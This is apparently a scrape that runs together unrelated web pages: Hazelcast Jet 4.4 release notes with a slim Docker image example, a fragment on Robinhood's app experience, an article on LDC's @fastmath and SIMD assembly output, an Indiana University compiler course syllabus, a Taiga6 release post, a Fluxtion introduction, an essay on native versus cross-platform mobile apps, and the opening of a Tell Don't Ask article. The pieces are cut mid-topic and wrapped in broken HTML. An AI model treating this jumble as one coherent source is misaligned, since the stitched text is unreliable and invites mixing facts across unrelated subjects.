<p>We used to offer Jet packaged with some hand-picked extensions while you
could add others by downloading them separately. As of 4.4 we offer two
kinds: a full package with all the extensions, and a slim one with none.
Normally you want to use the full package, but if you want to optimize
the download size or disk usage, use the slim package.</p>
<p>Along the same lines, we now provide a slim Docker image,
<code>hazelcast/hazelcast-jet:4.4-slim</code>, to serve as the base image in your
Dockerfile that combines it with the extensions, like this:</p>
<pre><code><span>FROM</span> hazelcast-jet:<span>4.4</span>-slim
<span>ARG</span> JET_HOME=/opt/hazelcast-jet
<span>ARG</span> REPO_URL=https://repo1.maven.org/maven2/com/hazelcast/jet
<span>ADD</span><span> <span>$REPO_URL</span>/hazelcast-jet-kafka/4.4/hazelcast-jet-kafka-4.4-jar-with-dependencies.jar <span>$JET_HOME</span>/lib/</span>

</code></pre>
<p>See the
<a href="https://jet-start.sh/docs/operations/docker#build-a-custom-image-from-the-slim-image">instructions</a>
in our docs for more details.</p>
<h2>Full Release Notes</h2>
<p>Hazelcast Jet 4.4 is based on IMDG version 4.1.1. Check out its Release
Notes <a href="https://docs.hazelcast.org/docs/rn/index.html#4-1-1">here</a> and,
for the Enterprise Edition,
<a href="https://docs.hazelcast.org/docs/ern/index.html#4-1-1">here</a>.</p>

<p>Thank you for your valuable contributions!</p>
<h3>New Features</h3>
<ul>
<li><p>[sql] SQL Beta: submit jobs to Jet from the command-line SQL shell.
(#2595, #2636, #2648, #2654, #2665, #2729, #2763, #2788)</p></li>
<li><p>[file-api] [017] Unified API to create sources and sinks from
file-like resources: local filesystem, Amazon S3, Azure Blob Storage
and Data Lake Storage, Google Cloud Storage (#2518)</p></li>
<li><p>[kinesis] [018] Amazon Kinesis connector (#2656)</p></li>
<li><p>[pipeline-api] [016] Prevent event reordering: by default Jet reorders
data for performance, now you can disable this to get strict event
order where you need it.</p></li>
</ul>
<h3>Enhancements</h3>
<ul>
<li><p>[connectors] @hhromic improved the naming of source and sink stages
across different connectors, bringing them all in line with the same
convention <code>xSource</code> / <code>xSink</code> (#2685)</p></li>
<li><p>[pipeline-api] @TomaszGaweda added the <code>pipeline.isEmpty()</code> method
that tells whether it contains any stage (#2659)</p></li>
<li><p>[core] @TomaszGaweda added the
<code>jet.imdg.version.mismatch.check.disabled</code> config property that
disables the enforcement of the exact IMDG dependency version. This
allows adding IMDG quick fixes to the existing Jet release. (#2610)</p></li>
<li><p>[core] New packaging: download either the full package with all the
extensions enabled, or the minimal package and separately download the
extensions you want. (#2796)</p></li>
<li><p>[cli] Improved the behavior of <code>jet submit</code>: now it waits for the job
to start and prints a message about it. (#2699)</p></li>
<li><p>[python] Improved the error message when using a Python function but
Python is not installed. (#2672)</p></li>
<li><p>[kafka] Improved the performance of the Kafka source by fine-tuning
some timeouts. (#2732)</p></li>
</ul>
<h3>Fixes</h3>
<ul>
<li><p>[core] Fixed a problem where Jet would close <code>System.out</code> during JVM
shutdown, preventing shutdown hooks from printing to stdout. (#2649)</p></li>
<li><p>[file-connector] Fixed the blocking File connector declaring its
processors as cooperative, resulting in performance loss. (#2628)</p></li>
<li><p>[file-connector] Several bug fixes in the File connector. (#2772)</p></li>
<li><p>[core] Fixed a leak caused by Jet's ephemeral loggers created for each
job. They didn't get released from internal maps in the logging
framework. (#2737)</p></li>
<li><p>[core] Fixed two problems with the <code>peek</code> transform. (#2740, #2765)</p></li>
<li><p>[hadoop] Fixed a problem when using Hadoop for local files, it behaved
as if the files were shared. (#2764)</p></li>
</ul>
<h3>Breaking Changes</h3>
<p>None.</p>

<div data-id="de68357" data-element_type="widget" data-widget_type="text-editor.default">

</div>
<div data-id="e2cc62c" data-element_type="widget" data-widget_type="text-editor.default">

<p>One thing is certain: Robinhood were scrambling to react to these spontaneous decisions, and the execution was poor.</p>
</div>
</div>
<div data-id="897910b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>But the rush to push changes is not a valid excuse for a poor experience. In fact, it just fuelled the fire—probably contributing to the hundreds of thousands of 1-star ratings on the app stores, and Robinhood trending on Twitter.</p>

<div data-id="85a773b" data-element_type="widget" data-widget_type="text-editor.default">

<div data-id="90aebad" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>So let’s summarise the key points here:</p>
</div>
</div>
<div data-id="70f3e6c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>1: Context matters —</strong> take those extra few minutes to explain to your users <em>why</em> you’ve made a difficult decision.</p>
</div>
</div>
<div data-id="7de0215" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>2: Remove ambiguity&nbsp; —</strong> give people realistic expectations for when certain restrictions will be lifted, and what they can do in the meantime.</p>
</div>
</div>
<div data-id="f11d414" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>3: Show empathy&nbsp; —</strong> apologising isn’t enough, you need to demonstrate that you understand why your users will be suffering, and how hard it is for them.</p>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>An article about the new <a href="https://wiki.dlang.org/LDC-specific_language_changes#.40.28ldc.attributes.fastmath.29"><code>@fastmath</code></a> and <a href="https://wiki.dlang.org/LDC-specific_language_changes#Traits"><code>__traits(target*)</code></a> features in LDC 1.1.0. The <code>@fastmath</code> attribute relaxes floating point math constraints and is used by <a href="https://github.com/libmir/mir">Mir</a> to <a href="http://blog.mir.dlang.io/glas/benchmark/openblas/2016/09/23/glas-gemm-benchmark.html">beat OpenBLAS and Eigen</a>.</em><br>
<em>To avoid confusion: <a href="http://llvm.org/">LLVM</a> is doing the interesting work, LDC just adds a few pieces that allow LLVM to work its magic.</em><br>
<em>I’m afraid it won’t be a nice read if you are unfamiliar with some of peculiarities of the CPU’s <a href="http://www.cprogramming.com/tutorial/floating_point/understanding_floating_point_representation.html">floating point</a> math, <a href="https://en.wikipedia.org/wiki/X86_assembly_language#Syntax">x86 assembly</a>, or <a href="https://en.wikipedia.org/wiki/SIMD">SIMD</a>.</em></p>



<p>The available SIMD parallelism in the CPU is very powerful: with the <a href="https://software.intel.com/en-us/blogs/2013/avx-512-instructions">AVX512 instruction set</a>, the CPU packs 16 (!) 32-bit floats in one register and can do a SIMD multiplication-addition twice (!) per clock cycle. So programming for performance boils down to writing your code such that the compiler can generate code that maximally exploits SIMD.<br>
Two weeks ago, <a href="https://www.linkedin.com/in/ilya-yaroshenko-46464993">Ilya Yaroshenko</a> wrote the article <a href="http://blog.mir.dlang.io/glas/benchmark/openblas/2016/09/23/glas-gemm-benchmark.html">“Numeric age for D: Mir GLAS is faster than OpenBLAS and Eigen”</a>. The article presents performance benchmarks of his linear algebra additions to <a href="https://github.com/libmir/mir">Mir</a>, a generic numerical library written in D, demonstrating that his D code is fast and beats well-known assembly language implementations of the same functionality.<br>
For very high performance, common implementations of basic math primitive functions are written in assembly language explicitly instead of trusting the compiler to generate equally fast machine code. In contrast, Ilya writes: “Mir GLAS (Generic Linear Algebra Subprograms) has a single generic kernel for all CPU targets, all floating point types, and all complex types. It is written completely in D, without any assembler blocks.” That’s quite an achievement: carefully optimized D code that performs as fast as carefully optimized assembly code. In this article I’ll present a few (simple) additions to LDC that enable LLVM’s magical optimizer to generate such fast assembly code for Ilya’s amazing D code.</p>



<p>I’ll show assembly code snippets generated by LDC using <code>-c -output-s</code>. LDC version 1.1.0-beta2 or newer is needed. You can use the online compiler at <a href="http://ldc.acomirei.ru/">ldc.acomirei.ru</a> to look at the assembly code that LDC generates yourself, for the examples given here and for your own D code.<br>
<em>If you find that the generated assembly for your D code could be improved, submit an <a href="https://github.com/ldc-developers/ldc/issues">LDC issue</a> on Github, <a href="https://github.com/ldc-developers/ldc/issues/1438">like Ilya did</a>!</em></p>



<p>The CPU’s floating point math is not the same as algebraic math, because of approximation errors due to the finite storage available for a floating point number after each calculation. The calculation <code>a + (b + c)</code> may or may not be equal to <code>(a + b) + c</code>, and <code>(a + a) - a</code> may or may not be equal to <code>a</code>. With <a href="https://en.wikipedia.org/wiki/Multiply%E2%80%93accumulate_operation#Fused_multiply.E2.80.93add">fused multiply-add (FMA)</a>, <code>a * b + c</code> is not the same as, well…, <code>a * b + c</code>. This often prevents optimization of math code, unless the programmer tells the compiler that, really, it’s all the same to him.<br>
Let’s look at a basic math function and see how we can improve the compiler-generated machine code.</p>



<p>The following code calculates the <a href="https://en.wikipedia.org/wiki/Dot_product">dot-product</a> of two vectors of arbitrary length:</p>

<div><div><pre><code><span>double</span> <span>dot</span><span>(</span><span>double</span><span>[]</span> <span>a</span><span>,</span> <span>double</span><span>[]</span> <span>b</span><span>)</span> <span>{</span>
    <span>double</span> <span>s</span> <span>=</span> <span>0</span><span>;</span>
    <span>foreach</span> <span>(</span><span>size_t</span> <span>i</span><span>;</span> <span>0</span> <span>..</span> <span>a</span><span>.</span><span>length</span><span>)</span> <span>{</span>
        <span>s</span> <span>+=</span> <span>a</span><span>[</span><span>i</span><span>]</span> <span>*</span> <span>b</span><span>[</span><span>i</span><span>];</span>
    <span>}</span>
    <span>return</span> <span>s</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The algebraic equation for the dot product is</p>

<p>s = (a1 * b1) + (a2 * b2) + (a3 * b3) + …</p>

<p>but because of the inaccuracies of floating-point math, the D code calculation must be described as:</p>

<p>s = ((((0 + a1 * b1) + a2 * b2) + a3 * b3) + … )</p>

<p>The parens are important: they signify the order of operations, <a href="http://www.walkingrandomly.com/?p=5380">absolutely critical</a> for the outcome. From this equation, we can see that the multiplications can be done in any order and in parallel, but that the additions must be done sequentially and in a very specific order.</p>

<p>Let’s see what assembly code LDC 1.1.0 generates (<a href="https://en.wikipedia.org/wiki/X86_assembly_language#Syntax">AT&amp;T dialect</a>). I’ll only show the meat of the dot function, in this case the 4-fold-unrolled inner loop:</p>

<p><code>ldc2 -c -output-s -O3 -release dot.d</code></p>

<div><div><pre><code>LBB0_4:
  movsd (%rcx,%rdi,8), %xmm1
  mulsd (%rsi,%rdi,8), %xmm1
  addsd %xmm0, %xmm1
  movsd 8(%rcx,%rdi,8), %xmm0
  mulsd 8(%rsi,%rdi,8), %xmm0
  addsd %xmm1, %xmm0
  movsd 16(%rcx,%rdi,8), %xmm1
  mulsd 16(%rsi,%rdi,8), %xmm1
  addsd %xmm0, %xmm1
  movsd 24(%rcx,%rdi,8), %xmm0
  mulsd 24(%rsi,%rdi,8), %xmm0
  addsd %xmm1, %xmm0
  addq  $4, %rdi
  cmpq  %rdi, %rdx
  jne LBB0_4
</code></pre></div></div>

<p>No vectorization: it’s just sequential multiply-add-multiply-add-multiply-add-…</p>

<p>But wait, I forgot to tell the compiler that my CPU is newer than the default <code>core2</code> CPU (nota bene, at least on OS X, by default LDC compiles your code for a 10-year-old processor). In this case it doesn’t matter much:</p>

<p><code>ldc2 -c -output-s -O3 -release dot.d -mcpu=haswell</code></p>

<p>Don’t be fooled by the “v” seemingly implying “vector”. Those multiply and add instructions are mere <em>single</em> double-precision operations. The loop is unrolled 8-fold, and that’s all that changed. Without relaxing some constraints on the mathematics, it’s the best possible.</p>



<p>One performance improvement is to allow the compiler to ‘fuse’ <code>a*b+c</code> into one instruction <code>fma(a,b,c)</code>. It will change the outcome of the calculation, but for many use-cases it won’t matter. Note: the result using FMA is <em>not</em> necessarily worse than before (it may well be more accurate), it’s just <em>different</em> and that’s why the compiler can’t use FMA per default.</p>

<p>We can instruct LLVM to allow “unsafe-fp-math” transformations such as FMA using the LDC attribute <a href="https://wiki.dlang.org/LDC-specific_language_changes#.40.28ldc.attributes.llvmAttr.28.22key.22.2C_.22value.22.29.29"><code>@llvmAttr("unsafe-fp-math", "true")</code></a> (you’re not recommended to use this low-level attribute, please read on).</p>

<p>LLVM replaced the multiply and add instructions with non-vectorized fused multiply-add instructions, clearly a win. But the code is still not using the vectorized instruction set of the CPU.</p>



<p>For vectorization of our code, there is one last piece missing: telling LLVM that it’s OK to do whatever it wants with our floating point operations: e.g. the code does not have to support NaN or infinity, and it can change the order (!) of the add operations in our dot product. LLVM’s <a href="http://llvm.org/docs/LangRef.html#fast-math-flags">Fast Math Flags</a> are used for this, and you can apply this to all floating point operations in a function using the (low-level, not recommended) LDC attribute <code>@llvmFastMathFlag</code>. We combined <code>@llvmAttr</code> and <code>@llvmFastMathFlag</code> into the <a href="https://wiki.dlang.org/LDC-specific_language_changes#.40.28ldc.attributes.fastmath.29"><code>@fastmath</code></a> attribute.</p>

<p>I recommend the usage of <code>@fastmath</code> instead of the other two low-level attributes; it is much more resilient against LLVM changes. The burder is on LDC to make <code>@fastmath</code> work with whatever attributes LLVM will require in the future.</p>

<p>With <code>@fastmath</code> the result becomes:</p>

<p>We now have a nicely vectorized dot-product function: the <code>vfmadd132pd</code> instruction performs a vectorized fused multiply-add operation, in this case it’s the equivalent of 4 non-vectorized operations. Each loop iteration processes 32 vector elements.</p>



<p>In the examples above, the D code did not specify the target architecture: all vectorization happens automatically. All credit must go to LLVM’s amazing backend that is able to analyze and optimize the code so well. So when you’d be compiling for a new processor with wider SIMD registers, all you’d have to do is recompile for that CPU and the D code would become even faster:<br>
<code>ldc2 -c -output-s -O3 -release dot.d -mcpu=knl</code> results in <code>vfmadd231pd  (%rcx,%rdi,8), %zmm4, %zmm0</code> instructions that process 8 vector elements at a time (“knl” stands for <a href="https://en.wikipedia.org/wiki/Xeon_Phi#Knights_Landing">Intel’s Knights Landing</a>).<br>
If your target is an ARM processor with <a href="http://www.arm.com/products/processors/technologies/neon.php">NEON SIMD tech</a>, you’ll automatically get vectorized FMA code too:</p>

<p><code>ldc2 -c -output-s -O3 -release dot.d -mtriple=aarch64-none-linux-gnu -mattr=+neon</code></p>

<div><div><pre><code>.LBB0_5:
  ldp q2, q3, [x9, #-16]
  ldp q4, q5, [x10, #-16]

  add x10, x10, #32

  fmla  v1.2d, v5.2d, v3.2d
  cbnz  x11, .LBB0_5
</code></pre></div></div>



<p>The dot-product example above is a very simple function. For more complex algorithms, you can get better performance if you take the sizes of the CPU’s caches into account; the characteristics of the instruction and data caches are both important for performance tuning.</p>

<p>LDC 1.1.0 has <a href="https://wiki.dlang.org/LDC-specific_language_changes#Traits">two special <code>__traits</code></a> that give compile-time information about the compile target architecture: <code>__traits(targetHasFeature, "...")</code> and <code>__traits(targetCPU)</code>. For example, <code>__traits(targetHasFeature, "avx2")</code> returns true or false depending on whether the compile target supports <a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">AVX2</a> instructions or not.</p>

<p>Mir uses <code>__traits(targetHasFeature, "...")</code> to decide what vector types (say, a vector of 4 or 8 floats) to use in its algorithms, but I don’t know the exact how-and-why (yet? Ilya fill us in on …</p></div></article></div></div></div>

<p>Indiana University, Fall 2020</p>

<p>High-level programming languages like Racket make it easier to program
relative to low-level languages such as x86 assembly code. But how do
high-level languages work? There’s a big gap between Racket and
machine instructions for modern computers. In this class you learn how
to translate Racket programs (a dialect of Scheme) all the way to x86
assembly language.</p>

<p>Traditionally, compiler courses teach one phase of the compiler at a
time, such as parsing, semantic analysis, and register allocation. The
problem with that approach is it is difficult to understand how the
whole compiler fits together and why each phase is designed the way it
is. Instead, each week we implement a successively larger subset of
the Racket language. The very first subset is a tiny language of
integer arithmetic, and by the time we are done the language includes
first-class functions.</p>

<p><strong>Prerequisites:</strong> B521 or C311. Fluency in Racket is highly recommended
as students will do a lot of programming in Racket. Prior knowledge of
an assembly language helps, but is not required.</p>

<p><strong>Textbook:</strong> The notes for the course are available
<a href="https://www.dropbox.com/s/ktdw8j0adcc44r0/book.pdf?dl=1">here</a>. If
you have suggestions for improvement, please either send an email to
Jeremy or, even better, make edits to a branch of the book and perform
a pull request. The book is at the following location on github:</p>

<p><strong>Grading:</strong></p>

<p>Course grades are based on the following items. For the weighting, see
the Canvas panel on the right-hand side of this web page.  Grading
will take into account any technology problems that arrise, i.e., you
won’t fail the class because your internet went out.</p>

<ul>
  <li>Assignments</li>
  <li>Quizzes</li>
  <li>Midterm Exam (October 23, Online as a Canvas Quiz)</li>
  <li>Final Exam (December 15, Online as a Canvas Quiz)</li>
</ul>

<p><strong>Assignments:</strong></p>

<p>Organize into teams of 2-4 students. Assignments will be due bi-weekly
on Mondays at 11:59pm. Teams that include one or more graduate
students are required to complete the challenge exercises.</p>

<p>Assignment descriptions are posted on Canvas.
Turn in your assignments by creating a github repository and giving
access to Jeremy (jsiek) and Caner (cderici).</p>

<p>Assignments will be graded based on how many test cases they succeed on.
Partial credit will be given for each “pass” of the compiler.
Some of the tests are in the public support code (see Resources below)
and the rest of the tests will be made available on Sunday night, one
day prior to the due date. The testing will be done on the linux
machine kj.luddy.indiana.edu named
after <a href="https://en.wikipedia.org/wiki/Katherine_Johnson">Katherine
Johnson</a> of NASA
fame. The testing will include both new tests and all of the tests
from prior assignments.</p>

<p>You may request feedback on your assignments prior to the due date.
Just commit your work to github and send us email.</p>

<p>Students are responsible for understanding the entire assignment and
all of the code that their team produces. The midterm and final exam
are designed to test a student’s understanding of the assignments.</p>

<p>Students are free to discuss and get help on the assignments from
anyone or anywhere. When posting questions on Piazza, it is OK to post
your code.</p>

<p>In contrast, for quizzes and exams, students are asked to work
alone. The quizzes and exams are closed book.  We will be using
Respondus Monitor for online proctoring.</p>

<p>The Final Project is due Dec. 4 and may be turned in late up to
Dec. 11.</p>

<p><strong>Late assignment policy:</strong> Assignments may be turned in up to one
week late with a penalty of 10%.</p>

February 3, 2021 | https://blog.taiga.io/taiga6-release.html | <a href="https://web.archive.org/web/*/https://blog.taiga.io/taiga6-release.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><img alt="Taiga6 overview" src="https://blog.taiga.io/images/2021-01-26_whatsnewTaiga6/taiga6.jpg"></p>
<p>That's right, we, the Taiga team, felt we were at a crossroads. On one hand we had <strong>a stable and sustainable open source business</strong> that could evolve at a steady but calm pace. On the other hand, we felt <strong>we should be doubling down on our agenda</strong> towards a much better agile project management experience. The challenges were many, both technological and product driven. So far, we have tackled just a few of them and <strong>that's exactly what we're presenting today as Taiga6</strong>, our best release <strong>ever</strong> since Taiga 1.0.</p>
<h2><a id="lets-start-with-the-obvious-stuff">Let's start with the obvious stuff</a></h2>

<p>Sure, you might be as excited as us but you need <strong>to see and feel</strong> the new release. We absolutely get it! We've put together an express overview of the major changes that come with Taiga6.</p>
<h3><a id="user-interface-revamp">User Interface revamp</a></h3>

<p>Taiga's user interface has never stopped evolving but it had aged quite a bit. We're not talking just a new theme or some polishing, it's really <strong>more intuitive, slicker and faster than ever</strong>. This is still a work in progress but it's impossible not to notice the improvements. We believe this will be one of those major UI changes that will garner almost <strong>universal positive recognition</strong>.</p>
<p><a href="https://blog.taiga.io/images/2021-01-26_whatsnewTaiga6/revamp.gif"><img alt="Taiga6 UI revamp example" src="https://blog.taiga.io/images/2021-01-26_whatsnewTaiga6/revamp.gif"></a>

</p><figcaption>Nice feedback, nice touches. Click to enlarge.</figcaption>
<h3><a id="swimlanes-on-kanban">Swimlanes on Kanban</a></h3>

<p>Taiga's KANBAN ranks high in flexibility and features. That's probably because we always thought KANBAN was deceptively simple and we made sure you got <strong>all its potential</strong>, not a second-class agile citizen. But... we lacked swimlanes. <strong>Swimlanes allow your team to create independent paths</strong> for your KANBAN cards and enjoy a much more powerful and flexible visual management state of things. Swimlanes can be almost anything you consider to deserve a particular space, from subteams to priorities or miniprojects. Try them out!</p>

<h3><a id="better-use-of-space">Better use of space</a></h3>

<p>Even if our screens get larger and larger and their resolutions dream of becoming 8K, we are quite <em>effective</em> at finding ways to get our digital workspace cluttered. Taiga was always weary of that annoying tendency to put on display as much as possible. What we've done is learn from user feedback, user interactions and most common behaviour pattern <strong>to redesign where things are, when they do appear and how you know they are there</strong>. <em>Lists of items</em> in particular and also <em>zoom levels</em> have been redesigned with your precious cognitive load in mind.</p>

<h3><a id="taiga-resources">Taiga Resources</a></h3>

<p>We had lots of information about Taiga scattered around. We decided to inventory all that was relevant about Taiga and create a <a href="https://resources.taiga.io/">new resources centre</a> for you to be assured that either your information need is satisfied there or it's accessible through it. <strong>Nearly everything has been written again from scratch</strong>, from tutorials, critical articles on agile techniques, community contributions or FAQs.</p>

<h3><a id="new-and-improved-text-editor">New and improved text editor</a></h3>

<p>Our dual HTML/Markdown editor was good enough for some time but it was time to acknowledge the amazing work by the great people at CKEditor. We have tweaked it a bit to address our Right-To-Left needs and also some convenient "stay on top" mode as well as keeping with the good "non-destructive mistakes" habits. Taiga's new editor will try hard <strong>to protect your half-baked changes whether your accidentally</strong> refresh page or click on cancel, hit escape, etc.</p>

</p><figcaption>Just focus on nice content...</figcaption>
<h2><a id="docker-image">Docker image</a></h2>

<p>We have back-pedalled on one of the most sacred long-standing truths here at Taiga; <em>"don't devote resources to an official on-premise/private cloud Taiga image"</em>. <strong>The response from the community was absolutely amazing</strong> providing quite a number of really great Taiga docker images and alternative deployment schemes. Eventually, we decided we should be taking a stance on the hundreds of thousands of private Taiga installations out there and <strong>provide an <a href="https://github.com/taigaio/docker-taiga">official Taiga docker image</a></strong>. Depending on its success and acceptance, we hope to expand to other ways for deploying Taiga.</p>
<p><a href="https://github.com/taigaio/docker-taiga"><img alt="Taiga6 editor" src="https://blog.taiga.io/images/2021-01-26_whatsnewTaiga6/docker.jpg"></a>

<h2><a id="what-to-expect">What to expect from Taiga in 2021</a></h2>

<p><strong>Short answer</strong>: A lot. <strong>Long answer</strong>: We want to go from the best open source agile project management platform to become one of the best project management platforms out there. We started this journey a few years ago and we are far from done. We want to do comprehensive under-the-hood tech overhaul as well as starting adding new project modules and really innovative features while we make sure to protect the key Taiga differentiators; <strong>ease of use, flexibility and straightforward agile for cross-domain teams</strong>.</p>
<p>Also, <strong>we developed Penpot</strong>, the first open source design and prototyping platform, <a href="https://penpot.app/">check it out</a>!</p>

<p>Welcome to Fluxtion streaming and thanks for coming, hope you enjoy exploring :)</p>

<p>Fluxtion is a java utility that builds embeddable, reactive complex event processors. 
The streaming api uses a functional programming style to define business logic. Write simple clean Java code 
to create real-time applications. All the complex heavy lifting is taken care of by Fluxtion, 
programs are quick to build, test, deploy and debug.</p>

<p>Fluxtion focuses on the processing logic of event streams, independent of messaging system. Areas of good fit include:</p>

<ul>
  <li><strong>Embedding real-time processing</strong> within an existing system</li>
  <li><strong>Edge processing</strong> executing on edge devices</li>
  <li><strong>No middleware vendor lock-in</strong> works with any messaging provider</li>
  <li><strong>Low latency</strong> or high performance requirements</li>
  <li><strong>Auditable systems</strong> supports ahead of time compilation</li>
</ul>

<p>Data streams can be merged, filtered, aggregated, joined, grouped and enriched. 
Windowing of data is fully supported. User functions are easily integrated to directly execute actions in addition to real-time monitoring.</p>

<p>A full set of tools for debugging, tracing, auditing and visualisation are provided to reduce development and support costs.</p>
      <h2 id="fluxtion-application-integration">
        
        
          <a href="#fluxtion-application-integration" aria-labelledby="fluxtion-application-integration"></a> Fluxtion application integration
        
        
      </h2>
    <hr>

<p><img src="https://v12technology.github.io/fluxtion/images/integration-overview.png" alt=""></p>

<p>A Fluxtion event processor embeds within a user application, processing events, 
publishing events to sinks or interacting with user classes. Events are feed from 
the application directly into the processor or into a pipeline. A pipeline provides 
additional capabilities such as threading, scheduling, auditing, access control</p>

February 3, 2021 | https://www.wfff.info/mobile-native-vs-cross-platform | <a href="https://web.archive.org/web/*/https://www.wfff.info/mobile-native-vs-cross-platform">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="comp-kknyjvzi" data-testid="richTextElement"><p><span>Recently I was asked this question and it got me thinking. This article is still an ongoing piece of work so any comments and suggestions are welcome.</span></p>

<p><span><span>​</span></span></p>

<p><span>I have worked in the last 10 years as an iOS native developer. I’ve had to manage my own memory in Objective-C with [retain] and [release] and got to work with Swift 5 and Autolayout. I also dipped my toes into Android, React Native, Ionic and have previously worked with C++, .net, J2ME and others.</span></p>

<p><span><span>​</span></span></p>

<p><span>Hence from my experience these are some types of companies that would benefit from doing things all native (iOS, Android or both):&nbsp;</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;1. Companies that already started with native apps a long time before and already have a significant codebase in native.</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;2. Companies for whom money is not a problem, but quality and performance is very important. They want the best there is and have no problem paying for that. Usually these are already large companies with a lot of sales and that have an important brand to protect. Ex: Banks, Automotive, Telecoms, Airlines, Electronics etc..</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;3. Companies that require a project that heavily uses some features close to the operating system. Examples: heavy use of video, or graphics, some types of games, fitness trackers or other apps that make constant use of sensors and run in the background. They also need to be the first that take advantage of a new feature in the OS.</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;4. Companies that require a large and complex project. If you have a project with a complex UI and with many features. &nbsp;Often these are companies that already have a cross-platform project but it has become so large that it is getting difficult to maintain and might already have performance issues that are causing a bad user experience. They already are paying for a team of developers to maintain the app so there won’t be much of an economy if switching to native.</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;5. Companies whose core service is through an app. Examples: Uber, Revolut, etc.. These are companies who cannot risk the app being broken or taken offline because of a change in the framework they are using. Moreover they require the app to work flawlessly, and be so good as to be featured in the AppStore or Google Play. Being in the top 5 apps is almost a requirement. Therefore it’s better to use the native tools that are guaranteed to be supported and that allow for a great user experience.</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;6. For startups that need an MVP I would recommend starting with a native app in only one platform Android or iOS, whichever is closer to their potential customers. After you test it in the real world and have gone through several iterations of build+validation and started to have traction and funding, you can now invest in a second app for the other platform, having the advantage that you already have the first. Going native will allow you to iterate faster because the development process is making use of better tools and better support. Otherwise if you would start with a cross-platform solution you will find at some point that it doesn’t scale, or it has become too buggy and unstable to support different UIs (iPhone, iPad, Android, watch etc) from one codebase and that you will be forced to rebuild native anyway.</span></p>

<p><span><span>​</span></span></p>

<p><span><span><span>What companies would NOT benefit from native app development vs cross-platform apps?</span></span></span></p>

<p><span><span><span>​</span></span></span></p>

<p><span>&nbsp; 1. Companies that already have a working mobile website and want to reuse a lot of that code then it’s probably better to go cross-platform.</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;2. Companies that have a lot of programmers and know-how in a certain technology ( ex: Javascript, Microsoft technologies) and wish to leverage that. If you have many people with experience in .net, you might want to try Xamarin. Likewise if you have many people with experience in React or other Javascript frameworks, you might want to try React Native or Ionic. This still means you occasionally will need to find someone who can work with native but those can be outside consultants and most of the codebase can be maintained by using the know-how inside the company.</span></p>

<p><span><span>​</span></span></p>

<p><span>&nbsp; &nbsp;3. Internal apps that must work on many platforms and UI smoothness and beauty is not a concern, but resources in terms of people and time are.&nbsp;</span></p>

<p><span>&nbsp;If you need to make an app that you don’t think will be maintained. Examples are apps for conferences or promotional campaigns that will only be used for a period of time and are afterwards useless, apps for conducting studies or surveys.&nbsp;</span></p>

<p><span>&nbsp;If you have an app that should look the same way across all platforms disregarding UI guidelines. Examples: Many games are like that, made in Unity or other frameworks and have their own look and feel which is platform independent.</span></p>

<p><span><span>​</span></span></p>

<p><span><span><span>Frequent issues with cross-platform solutions:</span></span></span></p>

<p><span><span><span>​</span></span></span></p>

<ul>
	<li>
	<p><span>Memory issues when scaling the app.</span></p>
	</li>
	<li>
	<p><span>Animations and “snappiness”. Animations will not be automatically supported and actually more difficult to implement in cross-platform solutions.</span></p>
	</li>
	<li>
	<p><span>Lack of proper tools — Often, there is no debugger and no performance measurement tools.</span></p>
	</li>
	<li>
	<p><span>Uncertainty of whether that platform will still be supported in a few years. There have been cases of cross-platform tools that were either abandoned (Flash) or acquired and then axed (Parse). Even so, generally there seems to be a trend of people liking the newest cross-platform tools</span></p>
	</li>
	<li>
	<p><span>A tendency to prefer the "new and trending" tools</span></p>
	</li>
</ul></div><div id="comp-kko39lkc" data-testid="richTextElement"><p><span>&nbsp; &nbsp; &nbsp; &nbsp; <span><a href="https://medium.com/swlh/why-i-dont-use-cross-platform-mobile-dev-tools-ac57ddc582b0" target="_blank" rel="noopener">source</a></span></span></p>

<p><span><span><span>​</span></span></span></p>

<ul>
	<li>
	<p><span>Too small community. Programmers need other programmers to learn from or use their open-source code. If there aren’t many others then you will be stuck fixing some obscure bug or having to build something from scratch for that particular platform.</span></p>
	</li>
	<li>
	<p><span>You still need access to native developers. Some parts will still have to be made native and often bugs will have to be fixed in the bridging platform. In RN there is a frequent issue of using open-source libraries that are not maintained or are buggy and some work still needs to be made on the native part to keep them up-to-date.</span></p>
	</li>
	<li>
	<p><span>Many companies that started with cross-platform tools have ultimately abandoned them: Facebook, <span><a href="https://venturebeat.com/2013/04/17/linkedin-mobile-web-breakup/" target="_blank" rel="noopener">LinkedIn</a></span>, <span><a href="https://medium.com/airbnb-engineering/sunsetting-react-native-1868ba28e30a" target="_blank" rel="noopener">Airbnb</a></span>, etc..&nbsp;</span></p>
	</li>
	<li>
	<p><span>Delayed access to having the latest and greatest of what features the OS can provide. New features released on Android and iOS must be adapted in order to be available using cross-platform libraries. This means there will be an unknown delay between their official release and being able to use them in your code.</span></p>
	</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Modifying data in a class where they reside is always a good thing. The Tell Don’t Ask principle guides us on how to follow such an approach. Unfortunately, it is widespread to obtain data from object and process it inside some service or manager class. After this article, you will know how to talk with objects and process data inside them instead of pulling their logic out of objects. You will be able to test your new skill with kata exercise.</p>



<h3>Benefits of Tell Don’t Ask principle</h3>



<p>At the first glance, obeying the Tell Don’t Ask principle might look like a cosmetic change for the code. In fact, it provides a lot more than just a simpler, less coupled clean code. By following this principle, you will follow OOP with ease by:</p>



